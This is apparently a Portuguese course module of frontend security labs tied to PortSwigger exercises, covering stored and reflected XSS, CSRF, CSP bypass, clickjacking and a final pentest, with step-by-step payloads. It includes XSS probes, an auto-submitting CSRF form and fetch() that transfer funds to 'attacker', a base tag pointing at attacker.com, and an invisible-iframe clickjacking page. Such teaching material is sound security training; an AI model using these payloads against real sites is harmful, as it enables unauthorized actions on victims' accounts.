# 🌐 Módulo 13: Labs de Frontend Security

## Pré-requisitos

| Pré-requisito | Nível | Observação |
|---------------|-------|------------|
| HTML/JavaScript | ⭐⭐ | Tags e eventos |
| HTTP/HTTPS | ⭐⭐ | Headers e requests |
| Browser DevTools | ⭐⭐ | Inspeção e console |
| Burp Suite | ⭐⭐⭐ | Interceptação |

---

## 📋 Exercício 1: XSS Stored

**Objetivo:** Injetar script malicioso que fica salvo no servidor

**Conhecimentos necessários:**
- Stored XSS (Cross-Site Scripting)
- Script execution em navegador
- Cookie theft

**Ferramentas:**
- Burp Suite
- Navegador

**Passo a passo:**

1. Identifique campos que salvam dados:
- Comentários
- Perfis de usuário
- Mensagens

2. Teste payload básico:
```html
<script>alert(1)</script>
```

3. Use variante com imagem:
```html
<img onerror=alert(1) src=x>
```

4. Intercepte com Burp e modifique

5. Teste em comentários:
```html
<script>alert('XSS')</script>
```

6. Verifique se persiste ao recarregar

**Macetes:**
- `<script>alert(1)</script>` para teste básico
- `<img onerror=alert(1) src=x>` para bypass de filtros
- Testar em TODOS os campos de entrada
- Verificar se persiste em diferentes sessões

**Checklist:**
- [ ] Campos de entrada identificados
- [ ] Payload básico testado
- [ ] Variantes testadas
- [ ] Burp Suite configurado
- [ ] Persistência verificada
- [ ] Cookie theft testado

**Link:** https://portswigger.net/web-security/cross-site-scripting/stored
**Tempo estimado:** 30 min

---

## 📋 Exercício 2: XSS Reflected

**Objetivo:** Explorar XSS via parâmetros na URL

**Conhecimentos necessários:**
- Reflected XSS
- URL parameters
- Encoding techniques

**Ferramentas:**
- Burp Suite
- Navegador

**Passo a passo:**

1. Identifique parâmetros na URL:
```
http://target/search?q=test
```

2. Injete payload:
```
http://target/search?q=<script>alert(1)</script>
```

3. Teste com encoding:
```
http://target/search?q=%3Cscript%3Ealert(1)%3C/script%3E
```

4. Use Burp para testar encoding

5. Verifique se o payload é refletido

6. Teste diferentes contextos (atributos, tags)

**Macetes:**
- `?q=<script>alert(1)</script>` para teste direto
- `%3Cscript%3E` para URL encoding
- Testar em diferentes contextos HTML
- Verificar Content-Type da resposta

**Checklist:**
- [ ] Parâmetros de URL identificados
- [ ] Payload direto testado
- [ ] URL encoding testado
- [ ] Burp usado para análise
- [ ] Contextos HTML verificados
- [ ] Content-Type verificado

**Link:** https://portswigger.net/web-security/cross-site-scripting/reflected
**Tempo estimado:** 25 min

---

## 📋 Exercício 3: CSRF

**Objetivo:** Criar página que faz ações como usuário autenticado

**Conhecimentos necessários:**
- Cross-Site Request Forgery
- CSRF tokens
- Request forgery

**Ferramentas:**
- HTML/JavaScript

**Passo a passo:**

1. Identifique ações sensíveis:
- Transferência de dinheiro
- Alteração de senha
- Exclusão de conta

2. Crie página HTML maliciosa:
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://target/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
</body>
</html>
```

3. Teste com JavaScript:
```html
<script>
fetch('http://target/transfer', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({to: 'attacker', amount: 10000})
});
</script>
```

4. Verifique se ações são executadas

5. Teste sem tokens CSRF

6. Documente requisições forgadas

**Macetes:**
- Form action="transfer" method=POST com auto-submit
- JavaScript para requests mais complexos
- `credentials: 'include'` para cookies
- Testar se tokens CSRF estão presentes

**Checklist:**
- [ ] Ações sensíveis identificadas
- [ ] Página HTML criada
- [ ] Auto-submit funcionando
- [ ] JavaScript testado
- [ ] Tokens CSRF verificados
- [ ] Ações executadas como vítima

**Link:** https://portswigger.net/web-security/csrf
**Tempo estimado:** 35 min

---

## 📋 Exercício 4: CSP Bypass

**Objetivo:** Bypassar Content Security Policy

**Conhecimentos necessários:**
- CSP directives (default-src, script-src, etc.)
- Bypass techniques
- XSS em scripts permitidos

**Ferramentas:**
- Burp Suite

**Passo a passo:**

1. Identifique CSP headers:
```bash
curl -I http://target | grep -i content-security-policy
```

2. Analise as diretivas:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

3. Procure XSS em scripts permitidos:
```
https://trusted.com/script.js
```

4. Teste base-uri se permitido:
```
<base href="https://attacker.com/">
```

5. Teste bypass via meta tags:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
```

6. Documente bypasses encontrados

**Macetes:**
- Procurar XSS em scripts de domínios permitidos
- Usar `base-uri` se configurado
- Verificar `unsafe-inline` e `unsafe-eval`
- Usar ferramentas como https://csp-evaluator.withgoogle.com/

**Checklist:**
- [ ] CSP headers identificados
- [ ] Diretivas analisadas
- [ ] Scripts permitidos mapeados
- [ ] XSS em scripts permitidos testado
- [ ] base-uri testado
- [ ] Bypasses documentados

**Link:** https://portswigger.net/web-security/csp
**Tempo estimado:** 40 min

---

## 📋 Exercício 5: Clickjacking

**Objetivo:** Criar página que engana o usuário para clicar

**Conhecimentos necessários:**
- X-Frame-Options header
- iframe overlay techniques
- UI redressing

**Ferramentas:**
- HTML/CSS

**Passo a passo:**

1. Verifique se o site pode ser emboxed:
```bash
curl -I http://target | grep -i x-frame-options
```

2. Crie página com iframe:
```html
<html>
<body>
  <iframe src="http://target" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
</body>
</html>
```

3. Posicione elemento sobre botão alvo:
```html
<button style="position: absolute; top: 300px; left: 100px;">
  Clique aqui para ganhar prêmio!
</button>
```

4. Ajuste opacity para 0 no iframe

5. Teste em diferentes browsers

6. Documente effectiveness

**Macetes:**
- iframe com `opacity:0` para invisibilidade
- Posicionamento absoluto sobre botão alvo
- Verificar `X-Frame-Options` e `frame-ancestors`
- Usar `sandbox` no iframe para limitar funcionalidades

**Checklist:**
- [ ] X-Frame-Options verificado
- [ ] iframe configurado
- [ ] Posicionamento testado
- [ ] Opacity ajustada
- [ ] Cross-browser testado
- [ ] Efetividade documentada

**Link:** https://portswigger.net/web-security/clickjacking
**Tempo estimado:** 30 min

---

## 📋 Exercício 6: Pentest Frontend Completo (Final Challenge)

**Objetivo:** Testar todas as vulnerabilidades frontend de um site

**Conhecimentos necessários:**
- Todas as técnicas do módulo
- OWASP Top 10
- Metodologia completa

**Ferramentas:**
- Burp Suite
- Navegador
- JavaScript

**Passo a passo:**

1. Mapeie a aplicação:
- Todas as rotas
- Formulários
- APIs consumidas

2. Teste cada tipo de XSS:
- Stored
- Reflected
- DOM-based

3. Teste CSRF em todas as ações

4. Verifique CSP e bypasses

5. Teste Clickjacking

6. Documente TODAS as vulnerabilidades encontradas

**Macetes:**
- Seguir OWASP Top 10 como checklist
- Testar em TODAS as entradas de dados
- Usar DevTools para debugar JavaScript
- Verificar headers de segurança

**Checklist:**
- [ ] Aplicação mapeada
- [ ] XSS Stored testado
- [ ] XSS Reflected testado
- [ ] DOM XSS testado
- [ ] CSRF testado
- [ ] CSP verificado
- [ ] Clickjacking testado
- [ ] Relatório gerado

**Link:** https://portswigger.net/web-security/all-labs
**Tempo estimado:** 90 min

---

## 📊 Resumo do Módulo

| Exercício | Habilidade | Tempo |
|-----------|-----------|-------|
| 1. XSS Stored | Injeção | 30 min |
| 2. XSS Reflected | URL params | 25 min |
| 3. CSRF | Request Forgery | 35 min |
| 4. CSP Bypass | Policy bypass | 40 min |
| 5. Clickjacking | UI redressing | 30 min |
| 6. Pentest Frontend | Integração | 90 min |
